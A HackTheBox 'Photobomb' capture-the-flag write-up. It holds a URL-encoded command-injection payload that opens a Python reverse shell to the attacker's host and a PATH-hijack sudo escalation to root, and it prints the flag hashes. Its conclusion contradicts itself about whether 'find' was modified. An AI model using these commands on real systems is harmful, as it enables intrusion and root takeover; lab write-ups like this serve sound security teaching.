# Introduction

The HackTheBox weekly machine named Photobomb was relatively easy to exploit. 

The first step involved discovering the login credentials by analyzing a JavaScript file. Once I gained access to an image manipulation panel using the credentials, I identified a command injection vulnerability and leveraged it to obtain execution and a shell. The privilege escalation phase was accomplished by executing a script as root, and there were two ways to achieve this. The first method involved exploiting a find command that was called without the full path, while the second method involved taking advantage of a disabled Bash builtin.

Looks like ports [22, 80] are Open.

To take a look at T80 we should add our an entry to `/etc/hosts`.
```
┌──(root㉿kali)-[~]
└─# echo "10.10.11.182 photobomb.htb" >>/etc/hosts
```

Clicking the `click here!` redirects to a page `/printer` which requires creds.

Manually inputing some creds showed no promise, but looking at the page source it looks to have a script it loads at the beginning of the page: `photobomb.js`.

Source: `photobomb.js`

Looks there's a possible username/password in the href.

Opening that URL looks to have let us login to the page.

Seems to have nothing of interest, but at the bottom there's a section for downloading an image.

Using Burp Suite we can intercept when seeing what this button does.

## Exploitation

Using the below payload injection seems we were able to establish a shell.
- `[LHOST]` your local host.
- `[LPORT]` your local port.

```
%3bexport+RHOST%3d"[LHOST]"%3bexport+RPORT%3d[LPORT]%3bpython3+-c+'import+sys,socket,os,pty%3bs%3dsocket.socket()%3bs.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))%3b[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)]%3bpty.spawn("sh")'
```

Before sending the payload, ensure you're listening on the port above.

Bingo.

![image](https://user-images.githubusercontent.com/29680216/221747683-4ecaa6d7-6073-4687-9538-062c02926472.png)

Now we need to get ourselves a shell, so we must spawn one.

```
$ python3 -c "import pty;pty.spawn('/bin/bash')"
python3 -c "import pty;pty.spawn('/bin/bash')"
wizard@photobomb:~/photobomb$ 
```

Bet. Now that we have a user shell, looks that we have a our first flag.

```
wizard@photobomb:~/photobomb$ ls ~/
ls ~/
photobomb  user.txt
wizard@photobomb:~/photobomb$ cat ~/user.txt    
cat ~/user.txt
a43c08bd49e712707dc3b67c766371d2
```

Now... Let's see what permissions we're working with.

```
wizard@photobomb:~/photobomb$ sudo -l
sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
wizard@photobomb:~/photobomb$ 
```

It looks like there's a script we can run as root: `/opt/cleanup.sh`. Seems we have read rights to view the contents of the script.

```
wizard@photobomb:~/photobomb$ ls -la /opt/cleanup.sh
ls -la /opt/cleanup.sh
-r-xr-xr-x 1 root root 340 Sep 15 12:11 /opt/cleanup.sh
```

Taking a peak that the scripts contents 

```
wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh
cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

We can try to overwrite the `find` script and bypass roots `PATH` so that it uses our modfied script to give us a root shell.
```
wizard@photobomb:~/photobomb$ echo "bash" > find
echo "bash" > find
wizard@photobomb:~/photobomb$ chmod +x find
chmod +x find
wizard@photobomb:~/photobomb$ sudo PATH=$PWD:$PATH /opt/cleanup.sh
sudo PATH=$PWD:$PATH /opt/cleanup.sh
root@photobomb:/home/wizard/photobomb# 
```

Solid. Now we have the root flag.

```
root@photobomb:/home/wizard/photobomb# ls ~/
ls ~/
root.txt
root@photobomb:/home/wizard/photobomb# cat ~/root.txt   
cat ~/root.txt
78dfb63bc7a8d3a0ddd4a6495c723c86
root@photobomb:/home/wizard/photobomb# 
```


## Conclusion

This was a fun box. I enjoyed the manual enumeration and the exploitation. I'm not sure if this was intended, but I was able to get a root shell without having to modify the `find` script. I was able to overwrite the `find` script and then run the `sudo` command with the `PATH` set to the current directory. This allowed me to run my modified `find` script and get a root shell.
